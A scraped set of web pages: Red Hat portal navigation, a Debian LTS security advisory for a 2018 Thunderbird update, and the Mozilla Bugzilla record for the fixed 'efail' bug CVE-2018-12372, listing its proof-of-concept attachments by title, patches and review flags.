* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from lists.debian.org_133d9ea9_20250125_084123.html ===


---

[[Date Prev](msg00012.html)][[Date Next](msg00014.html)]
[[Thread Prev](msg00012.html)][[Thread Next](msg00014.html)]
[[Date Index](maillist.html#00013)]
[[Thread Index](threads.html#00013)]

# [SECURITY] [DLA 1425-1] thunderbird security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1425-1] thunderbird security update
* *From*: Emilio Pozuelo Monfort <pochu@debian.org>
* *Date*: Sat, 14 Jul 2018 11:23:14 +0200
* *Message-id*: <[[🔎]](/msgid-search/4f65182e-fd2f-ff4e-6f72-940c6ff3543a%40debian.org) [4f65182e-fd2f-ff4e-6f72-940c6ff3543a@debian.org](msg00013.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Package        : thunderbird
Version        : 1:52.9.1-1~deb8u1
CVE ID         : CVE-2018-5188 CVE-2018-12359 CVE-2018-12360 CVE-2018-12362
                 CVE-2018-12363 CVE-2018-12364 CVE-2018-12365 CVE-2018-12366
                 CVE-2018-12372 CVE-2018-12373 CVE-2018-12374

Multiple security issues have been found in Thunderbird, which may lead
to the execution of arbitrary code, denial of service or attacks on
encrypted emails.

For Debian 8 "Jessie", these problems have been fixed in version
1:52.9.1-1~deb8u1.

We recommend that you upgrade your thunderbird packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEcJymx+vmJZxd92Q+nUbEiOQ2gwIFAltJwP4ACgkQnUbEiOQ2
gwIV1w/8DHnD+3I1FQrRNo8MewQlad18rMqGph4drpCvczMArR9jhYQ4PVWTH9sp
sBsjURxkEmunuzNwRP5c/S6hX7gcd5uVfidnffC5jTpCVDSJ0VyzwcWZ0XfsUuIo
GqC1Hvkfwtcmx/VCAKuS6c28WyAwf344QwVjyuT7M6ESJe7bkPj8X1jOWY4XWVKU
JO9wGKwKstki3nJfFKa65ShjYSxyv+DdSjd94aM1dEyz6jvjmXya7m5iZ1uvMbz8
m9PlKCQWbD2QHes+Guc8wEFok6RfL1gpIiVBU+41bSQIMJpZO2ckdwHbZSLvS8Yo
tw/7izMDQlvGFLa0J6+FzlIt1NMA1OIzDcgb/TZyxD+BZUawBPAbhFek56QU4fcW
F3taXHgY3a67/52VU5jE622qa4TUD1JSeD+rOm9EBR+jSiE8e9G090cSBRnWSUP8
70I0fpnYnBWnhkvCARNT+TTSs78CC/acLcGqL5PJwlIPUEfkx3d9HrkMdBjgaRjR
Kub0L2myekV7ymQQhtrVbkgihudVaLfWvy0MoxP9xKf91rKhlDQU5i+R2kWyu4iE
7Y4UQpPIukpp4tK1fJKgvLDd9SpWkynVnmhUpI3XS5ZDESn5ISX5+8qIAUZn0llL
AMunVE+axZM/82IZM5Hyz1fo9XggVzUh62W2F0L82RE6UTZhNbY=
=GqDy
-----END PGP SIGNATURE-----

```

---



=== Content from bugzilla.mozilla.org_9f38aab9_20250125_084123.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1419417)
* [XML](/show_bug.cgi?ctype=xml&id=1419417)

Closed
[Bug 1419417](/show_bug.cgi?id=1419417)
(CVE-2018-12372)

Opened 7 years ago
Closed 7 years ago

# [efail] S/MIME and PGP decryption oracles can be built with HTML emails

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

[efail] S/MIME and PGP decryption oracles can be built with HTML emails

## Categories

### (Thunderbird :: Security, defect)

[Product:](/describecomponents.cgi?product=Thunderbird)

Thunderbird
▾

Thunderbird
For bugs in MZLA's Thunderbird desktop mail client. Bugs in the back-end (e.g. protocols) should be filed in the [MailNews Core](https://bugzilla.mozilla.org/enter_bug.cgi?product=MailNews Core) product. Bugs in calendar should be filed in the [Calendar](https://bugzilla.mozilla.org/enter_bug.cgi?product=Calendar) product. Bugs for the chat features, file in the [Chat Core](https://bugzilla.mozilla.org/enter_bug.cgi?product=Chat%20Core) product.
[See Open Bugs in This Product](/buglist.cgi?product=Thunderbird&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Thunderbird)
Watch This Product

[Component:](/describecomponents.cgi?product=Thunderbird&component=Security#Security)

Security
▾

Thunderbird :: Security
For app-level security bugs.

If the problem relates to underlying components (PSM, NSS, Core, Toolkit) then please file it in the appropriate product instead of here.

[See Open Bugs in This Component](/buglist.cgi?product=Thunderbird&component=Security&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Thunderbird&component=Security&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Thunderbird&component=Security)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

52 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

## Tracking

### (thunderbird\_esr52 fixed, thunderbird\_esr60 fixed, thunderbird60 fixed, thunderbird61 wontfix, thunderbird62 fixed)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Thunderbird 62.0

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| thunderbird\_esr52 | --- | [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr52&o1=equals&v1=fixed) |
| thunderbird\_esr60 | --- | [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr60&o1=equals&v1=fixed) |
| thunderbird60 | --- | [fixed](/buglist.cgi?f1=cf_status_thunderbird_60&o1=equals&v1=fixed) |
| thunderbird61 | --- | [wontfix](/buglist.cgi?f1=cf_status_thunderbird_61&o1=equals&v1=wontfix) |
| thunderbird62 | --- | [fixed](/buglist.cgi?f1=cf_status_thunderbird_62&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-thunderbird |  | --- |
| thunderbird\_esr52 |  | fixed |
| thunderbird\_esr60 |  | fixed |
| thunderbird60 |  | fixed |
| thunderbird61 |  | wontfix |
| thunderbird62 |  | fixed |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| thunderbird133 | --- | --- |
| thunderbird134 | --- | --- |
| thunderbird135 | --- | --- |
| thunderbird136 | --- | --- |

## People

### (Reporter: jens.a.mueller, Assigned: jorgk-bmo)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=40)  [jorgk-bmo](/user_profile?user_id=176914)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=40)  [jens.a.mueller](/user_profile?user_id=588172)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

---

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

16 people

## References

### (Depends on 1 open bug, [URL](https://efail.de/ "https://efail.de/") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1462794](/show_bug.cgi?id=1462794 "REOPENED - Build error: cannot convert ‘nsPresState*’ to ‘mozilla::PresState*’ caused by left-over nsILayoutHistoryState.h in source tree"), [CVE-2018-5162](/show_bug.cgi?id=1457721 "RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute"), [1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>"), [1463047](/show_bug.cgi?id=1463047 "RESOLVED WORKSFORME - Crash on startup for self-built Thunderbird"), [1464391](/show_bug.cgi?id=1464391 "RESOLVED FIXED - New HTML processing introduced in bug 1419417 causes badly rendered HTML"), [1473893](/show_bug.cgi?id=1473893 "RESOLVED FIXED - Detaching attachments corrupts the main body of the e-mail text")

[CVE-2018-5185](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too"), [1462488](/show_bug.cgi?id=1462488 "RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[efail](/show_bug.cgi?id=1420217 "RESOLVED DUPLICATE - [efail] Full Plaintext Leak in PGP"), [1462473](/show_bug.cgi?id=1462473 "RESOLVED DUPLICATE - [efail] Bypassing 58.7.0 <form> mitigation")

Dependency [tree](/showdependencytree.cgi?id=1419417&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1419417)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[107035](/show_bug.cgi?id=107035 "RESOLVED DUPLICATE - HTML Attachment display affects base message"), [efail](/show_bug.cgi?id=1420217 "RESOLVED DUPLICATE - [efail] Full Plaintext Leak in PGP")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[efail.de](https://efail.de/ "https://efail.de/")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[efail](/show_bug.cgi?id=1420217 "RESOLVED DUPLICATE - [efail] Full Plaintext Leak in PGP")

[1462481](/show_bug.cgi?id=1462481 "RESOLVED FIXED - HTML Sanitizer class cleanup")

## Details

### (Keywords: sec-high)

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2018-12372

[Keywords:](/describekeywords.cgi)

[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | wanted-thunderbird |  |
| --- | --- | --- |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (18 files, 22 obsolete files)

| [Decryption oracle PoC 1: Leaking plaintext through reply/forward](/attachment.cgi?id=8930484)  [7 years ago](#c0)  [Jens Müller](/user_profile?user_id=588172)   3.45 KB, text/plain |  | [Details](/attachment.cgi?id=8930484&action=edit) |
| --- | --- | --- |
| [Decryption oracle PoC 2: Leaking plaintext through HTML forms](/attachment.cgi?id=8930485)  [7 years ago](#c1)  [Jens Müller](/user_profile?user_id=588172)   3.84 KB, message/rfc822 |  | [Details](/attachment.cgi?id=8930485&action=edit) |
| [Decryption oracle PoC 3: Leaking plaintext through src attribute](/attachment.cgi?id=8930486)  [7 years ago](#c2)  [Jens Müller](/user_profile?user_id=588172)   3.33 KB, text/plain |  | [Details](/attachment.cgi?id=8930486&action=edit) |
| [Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag](/attachment.cgi?id=8930487)  [7 years ago](#c3)  [Jens Müller](/user_profile?user_id=588172)   4.06 KB, message/rfc822 |  | [Details](/attachment.cgi?id=8930487&action=edit) |
| [Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag](/attachment.cgi?id=8930488)  [7 years ago](#c4)  [Jens Müller](/user_profile?user_id=588172)   4.06 KB, message/rfc822 |  | [Details](/attachment.cgi?id=8930488&action=edit) |
| [bug1419417\_efail\_reply\_fwd.patch](/attachment.cgi?id=8973795)  [7 years ago](#c23)  [Magnus Melin [:mkmelin]](/user_profile?user_id=101158)   2.29 KB, patch | jorgk-bmo : [review-](#c42 "7 years ago") | [Details](/attachment.cgi?id=8973795&action=edit) | [Diff](/attachment.cgi?id=8973795&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795) |
| [A1-dec-pgp-smime-html-reply.eml](/attachment.cgi?id=8975458)  [7 years ago](#c41)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   2.04 KB, text/plain |  | [Details](/attachment.cgi?id=8975458&action=edit) |
| [tb-smime-leak-1.png](/attachment.cgi?id=8975520)  [7 years ago](#c45)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   92.03 KB, image/png |  | [Details](/attachment.cgi?id=8975520&action=edit) |
| [tb-smime-leak-2.png](/attachment.cgi?id=8975523)  [7 years ago](#c46)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   90.96 KB, image/png |  | [Details](/attachment.cgi?id=8975523&action=edit) |
| [Sanitize quoted HTML](/attachment.cgi?id=8976050)  [7 years ago](#c59)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   2.68 KB, patch | jorgk-bmo : [review-](#c62 "7 years ago") | [Details](/attachment.cgi?id=8976050&action=edit) | [Diff](/attachment.cgi?id=8976050&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050) |
| [Sanitize quoted HTML (cleaned-up)](/attachment.cgi?id=8976054)  [7 years ago](#c61)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   2.76 KB, patch | jorgk-bmo : [feedback-](#c61 "7 years ago") | [Details](/attachment.cgi?id=8976054&action=edit) | [Diff](/attachment.cgi?id=8976054&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976054) |
| [Separate MIME parts from each other (for 52)](/attachment.cgi?id=8976074)  [7 years ago](#c69)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   15.17 KB, patch |  | [Details](/attachment.cgi?id=8976074&action=edit) | [Diff](/attachment.cgi?id=8976074&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976074) |
| [Sanitizer code cleanup](/attachment.cgi?id=8976085)  [7 years ago](#c71)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   13.72 KB, patch | mkmelin : [review+](#c78 "7 years ago")  jorgk-bmo : [review+](#c75 "7 years ago") | [Details](/attachment.cgi?id=8976085&action=edit) | [Diff](/attachment.cgi?id=8976085&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085) |
| [Sanitize quoted HTML, v3](/attachment.cgi?id=8976086)  [7 years ago](#c72)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   2.60 KB, patch |  | [Details](/attachment.cgi?id=8976086&action=edit) | [Diff](/attachment.cgi?id=8976086&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976086) |
| [Separate MIME parts from each other (for trunk)](/attachment.cgi?id=8976330)  [7 years ago](#c79)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   15.55 KB, patch |  | [Details](/attachment.cgi?id=8976330&action=edit) | [Diff](/attachment.cgi?id=8976330&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976330) |
| [Separate MIME parts from each other, v4 (trunk and 52)](/attachment.cgi?id=8976349)  [7 years ago](#c87)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   14.37 KB, patch |  | [Details](/attachment.cgi?id=8976349&action=edit) | [Diff](/attachment.cgi?id=8976349&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976349) |
| [Sanitizer code cleanup, v2](/attachment.cgi?id=8976351)  [7 years ago](#c88)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   14.78 KB, patch | jorgk-bmo : [review-](#c104 "7 years ago") | [Details](/attachment.cgi?id=8976351&action=edit) | [Diff](/attachment.cgi?id=8976351&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351) |
| [Sanitize quotes, v4 (for 52)](/attachment.cgi?id=8976363)  [7 years ago](#c92)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   4.66 KB, patch | jorgk-bmo : [feedback-](#c105 "7 years ago") | [Details](/attachment.cgi?id=8976363&action=edit) | [Diff](/attachment.cgi?id=8976363&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363) |
| [Sanitize quotes, v2 vs. v4 - Screenshots](/attachment.cgi?id=8976377)  [7 years ago](#c97)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   262.53 KB, image/png |  | [Details](/attachment.cgi?id=8976377&action=edit) |
| [tb-efail-attachment-separators.png](/attachment.cgi?id=8976703)  [7 years ago](#c118)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   49.05 KB, image/png |  | [Details](/attachment.cgi?id=8976703&action=edit) |
| [horizontal lines.png](/attachment.cgi?id=8976711)  [7 years ago](#c120)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   10.32 KB, image/png |  | [Details](/attachment.cgi?id=8976711&action=edit) |
| [DOM.png](/attachment.cgi?id=8977051)  [7 years ago](#c133)  [Richard Marti (:Paenglab)](/user_profile?user_id=282357)   20.94 KB, image/png |  | [Details](/attachment.cgi?id=8977051&action=edit) |
| [Separate MIME parts from each other, v4 (trunk only, with clean-up)](/attachment.cgi?id=8979059)  [7 years ago](#c145)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   14.00 KB, patch | mkmelin : [review+](#c150 "7 years ago")  jorgk-bmo : [review+](#c146 "7 years ago") | [Details](/attachment.cgi?id=8979059&action=edit) | [Diff](/attachment.cgi?id=8979059&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979059) |
| [1419417-fix-tests.patch](/attachment.cgi?id=8979060)  [7 years ago](#c147)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   4.44 KB, patch |  | [Details](/attachment.cgi?id=8979060&action=edit) | [Diff](/attachment.cgi?id=8979060&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979060) |
| [1419417-fix-tests.patch (v2)](/attachment.cgi?id=8979061)  [7 years ago](#c148)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   4.54 KB, patch |  | [Details](/attachment.cgi?id=8979061&action=edit) | [Diff](/attachment.cgi?id=8979061&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979061) |
| [1419417-remove-monkey-patch.patch](/attachment.cgi?id=8979062)  [7 years ago](#c149)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   1.06 KB, patch | mkmelin : [review+](#a15572834_101158 "7 years ago") | [Details](/attachment.cgi?id=8979062&action=edit) | [Diff](/attachment.cgi?id=8979062&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979062) |
| [Separate MIME parts from each other, v4b (trunk only, with clean-up)](/attachment.cgi?id=8979120)  [7 years ago](#c153)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   14.00 KB, patch | jorgk-bmo : [review+](#a15646030_176914 "7 years ago")  jorgk-bmo : [approval-comm-beta+](#a15756451_176914 "7 years ago")  jorgk-bmo : [approval-comm-esr52+](#a15756451_176914 "7 years ago")  jorgk-bmo : [approval-comm-esr60+](#a15756451_176914 "7 years ago") | [Details](/attachment.cgi?id=8979120&action=edit) | [Diff](/attachment.cgi?id=8979120&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979120) |
| [1419417-fix-tests.patch (v2)](/attachment.cgi?id=8979122)  [7 years ago](#c155)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   2.63 KB, patch | BenB : [review+](#c170 "7 years ago") | [Details](/attachment.cgi?id=8979122&action=edit) | [Diff](/attachment.cgi?id=8979122&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979122) |
| [1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]](/attachment.cgi?id=8979123)  [7 years ago](#c156)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   1.87 KB, patch | jorgk-bmo : [review+](#c157 "7 years ago") | [Details](/attachment.cgi?id=8979123&action=edit) | [Diff](/attachment.cgi?id=8979123&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979123) |
| [Separate MIME parts from each other, v5 (for 52)](/attachment.cgi?id=8979183)  [7 years ago](#c162)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   15.92 KB, patch |  | [Details](/attachment.cgi?id=8979183&action=edit) | [Diff](/attachment.cgi?id=8979183&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979183) |
| [Separate MIME parts from each other, v5 (for trunk)](/attachment.cgi?id=8979187)  [7 years ago](#c163)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   15.68 KB, patch |  | [Details](/attachment.cgi?id=8979187&action=edit) | [Diff](/attachment.cgi?id=8979187&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979187) |
| [Separate MIME parts from each other, v5.1 (for trunk)](/attachment.cgi?id=8979190)  [7 years ago](#c164)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   15.28 KB, patch | jorgk-bmo : [review-](#c189 "7 years ago") | [Details](/attachment.cgi?id=8979190&action=edit) | [Diff](/attachment.cgi?id=8979190&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190) |
| [Separate MIME parts from each other, v5.1 (for 52)](/attachment.cgi?id=8979192)  [7 years ago](#c165)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   15.33 KB, patch |  | [Details](/attachment.cgi?id=8979192&action=edit) | [Diff](/attachment.cgi?id=8979192&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979192) |
| [1419417-fix-tests.patch (v3)](/attachment.cgi?id=8979211)  [7 years ago](#c179)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   2.63 KB, patch |  | [Details](/attachment.cgi?id=8979211&action=edit) | [Diff](/attachment.cgi?id=8979211&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979211) |
| [<div> is correctly wrapping the HTMl email, with patch v5.\*](/attachment.cgi?id=8979245)  [7 years ago](#c185)  [Ben Bucksch (:BenB)](/user_profile?user_id=22599)   11.76 KB, image/png |  | [Details](/attachment.cgi?id=8979245&action=edit) |
| [test with image for attaching bug.eml](/attachment.cgi?id=8979258)  [7 years ago](#c188)  [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)   1.84 KB, text/plain |  | [Details](/attachment.cgi?id=8979258&action=edit) |
| [OpenPGP Signature Spoofing](/attachment.cgi?id=8979995)  [7 years ago](#c200)  [Jens Müller](/user_profile?user_id=588172)   3.59 KB, message/rfc822 |  | [Details](/attachment.cgi?id=8979995&action=edit) |
